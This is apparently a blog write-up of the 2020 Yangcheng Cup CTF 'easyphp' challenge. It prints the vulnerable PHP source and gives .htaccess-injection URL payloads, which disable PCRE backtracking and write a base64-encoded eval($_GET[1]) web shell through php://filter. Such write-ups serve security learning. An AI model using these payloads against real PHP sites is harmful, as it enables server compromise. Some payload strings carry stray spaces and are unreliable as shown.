# 原创
：  [羊城杯 2020]easyphp

# [羊城杯 2020]easyphp

#### [羊城杯 2020]easyphp

## easyphp

### 考点

> 
.htaccess的利用


### 思路

> 
在目录下，只有index.php能够作为php解析执行，于是我们可以写一个.htaccess让index.php自动包含执行代码；<br/> 思路一：向.htaccess文件写入shell，并且用auto_prepend_file包含.htaccess，但是file关键字被ban了，可以用换行绕过，结尾要用\处理content中的\n；<br/> 思路二：利用.htaccess文件特性，不过这次是通过设置php_value来设置preg_macth正则回溯次数；先写入.htaccess，再直接通过php://filter伪协议写入一句话


### Payload

> 
代码审计


```
&lt;?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nHello, world");
?&gt;

```

> 
方法一：向.htaccess文件写入shell，并且用auto_prepend_file包含.htaccess，详细见[之前的文章](https://blog.csdn.net/LYJ20010728/article/details/116541325)


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517210918674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517210926122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
方法二：绕过preg_math的配置，见[之前的文章](https://blog.csdn.net/LYJ20010728/article/details/116538926)


> 
先写入.htaccess<br/> `?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;f ilename=.htaccess`


> 
再直接通过php://filter伪协议写入一句话<br/> `?filename=php://filter/write=convert.base64-decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw&amp;1=phpinfo();`

